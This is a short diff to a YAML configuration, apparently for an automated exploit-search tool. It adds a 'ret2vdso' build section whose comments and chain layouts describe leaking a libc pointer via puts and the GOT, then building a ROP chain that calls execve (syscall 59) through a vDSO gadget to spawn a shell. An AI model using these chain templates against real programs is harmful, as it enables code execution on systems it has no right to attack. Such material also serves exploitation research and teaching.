@@ -28,6 +28,26 @@ mcts:
   terminal: true
   success: 0.30
 
+build:
+  technique: ret2vdso
+  # the vDSO is mapped at a near-static offset for the process's
+  # lifetime: gadgets in it survive PIE randomization of the main
+  # image. The leak stage: puts(GOT[puts]) rides the libc pointer out
+  # (the echo carries the raw bytes). The strike: the exploit hunts
+  # the vDSO's syscall gadget in the auxv walk (the leak facts), then
+  # rides the chain: pop rdi, rsi, rdx, rax; the vDSO's syscall; ret.
+  variants:
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_rsi_rdx_ret", "const:0", "const:0", "const:0",
+           "got_addr:puts", "plt_addr:puts"]
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_rsi_rdx_ret", "leak:sh_cmd", "const:0",
+           "const:0", "gadget:pop_rax_ret", "const:59", "leak:vdso_syscall"]
+
 priors: [1, 5]
 
 
